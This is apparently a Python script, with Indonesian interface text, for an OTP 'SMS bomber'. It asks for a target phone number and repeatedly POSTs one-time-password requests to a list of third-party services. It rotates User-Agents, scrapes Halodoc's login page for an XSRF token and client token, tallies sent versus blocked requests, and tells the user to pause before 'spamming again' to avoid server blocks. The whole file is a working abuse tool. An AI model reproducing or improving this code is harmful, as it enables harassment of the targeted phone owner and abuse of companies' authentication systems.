import os, sys, time, threading
from datetime import datetime
from config import _x
from junk import G, C, Y, R, P, W, N, _u

COLORS = ["\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m"]
done = False

def spinner():
    chars = ["◧","◨","◩","◪","◫","◰","◱","◲","◳","◴","◵","◶","◷"]
    i = 0
    while not done:
        c = COLORS[i % len(COLORS)]
        sys.stdout.write(f"\r  {c}{chars[i % len(chars)]}{N} Mengirim... ")
        sys.stdout.flush()
        i += 1
        time.sleep(0.08)
    sys.stdout.write("\r" + " " * 30 + "\r")

def countdown(seconds=300):
    print(f"\n  {Y}[!] Pake jeda dulu biar ga keblokir dari server.{N}")
    print(f"  {Y}[*] Tunggu {seconds//60} menit sebelum spam lagi.{N}")
    print(f"  {Y}[*] Atau exit + jalanin lagi kalo gasabar.{N}")
    print("")
    while seconds > 0:
        m = seconds // 60
        s = seconds % 60
        sys.stdout.write(f"\r  {P}⏳ Hitung mundur: {m:02d}:{s:02d}{N} ")
        sys.stdout.flush()
        time.sleep(1)
        seconds -= 1
    sys.stdout.write("\r" + " " * 40 + "\r")

def spam(phone):
    global done
    print(f"\n  {C}[*] Target : {phone}{N}")
    
    try:
        loop = int(input(f"  {C}[?] Loop (1-5): {N}").strip() or "1")
        if loop < 1: loop = 1
        if loop > 5: loop = 5
    except:
        loop = 1
    
    print(f"\n  {Y}Pilih Kecepatan:{N}")
    print(f"  {W}[1] 1 detik (Cepat){N}")
    print(f"  {W}[2] 2 detik{N}")
    print(f"  {W}[3] 3 detik (Normal){N}")
    print(f"  {W}[4] 4 detik{N}")
    print(f"  {W}[5] 5 detik (Aman){N}")
    try:
        speed = int(input(f"  {C}[?] Pilih (1-5): {N}").strip() or "3")
        if speed < 1: speed = 1
        if speed > 5: speed = 5
    except:
        speed = 3
    
    print(f"\n  {C}[*] Loop : {loop}x | Delay : {speed}s{N}\n")
    
    sent = []
    blocked = []
    failed = []
    
    for l in range(loop):
        if loop > 1:
            print(f"  {Y}--- Loop {l+1}/{loop} ---{N}")
        el = _x(phone)
        
        # Start spinner thread
        done = False
        t = threading.Thread(target=spinner)
        t.start()
        
        for name, url, h, b in el:
            h["User-Agent"] = _u()
            
            if b.pop("_halodoc", False):
                try:
                    import requests as _rr, re
                    s = _rr.Session()
                    s.headers.update({"User-Agent": _u()})
                    r = s.get("https://www.halodoc.com/login", timeout=10)
                    xsrf = s.cookies.get("XSRF-TOKEN", "")
                    h["X-XSRF-TOKEN"] = xsrf
                    match = re.search(r'clientToken["\']?\s*[=:]\s*["\']([a-f0-9]+)["\']', r.text)
                    ct = match.group(1) if match else "5a46f557bbabb198d46f00119c958ad0ddd25880508c1cc62337a8adac661af9"
                    url = f"https://www.halodoc.com/magneto-api/v2/users/authentication/otp/requests?clientToken={ct}"
                except:
                    pass
            
            try:
                import requests as _rr
                if b.pop("is_form", False):
                    rr = _rr.post(url, data=b, headers=h, timeout=15)
                else:
                    rr = _rr.post(url, json=b, headers=h, timeout=15)
                s = rr.status_code
                if s in (200, 201, 202): sent.append(name)
                elif s in (429, 403, 401): blocked.append(name)
                else: failed.append(name)
            except:
                failed.append(name)
            time.sleep(speed)
        
        done = True
        t.join()
        sys.stdout.write("\r" + " " * 40 + "\r")
    
    print(f"\n  {G}=== HASIL ==={N}")
    if sent: print(f"  {G}✓ Terkirim ({len(sent)}): {', '.join(sent)}{N}")
    if blocked: print(f"  {Y}⊗ Diblokir ({len(blocked)}): {', '.join(blocked)}{N}")
    if failed: print(f"  {R}✗ Gagal ({len(failed)}): {', '.join(failed)}{N}")
    print(f"\n  {C}Total: {len(sent)}/{len(el)*loop} terkirim{N}")
    
    countdown(300)
    
    input(f"\n  {W}[Enter] Kembali...{N}")
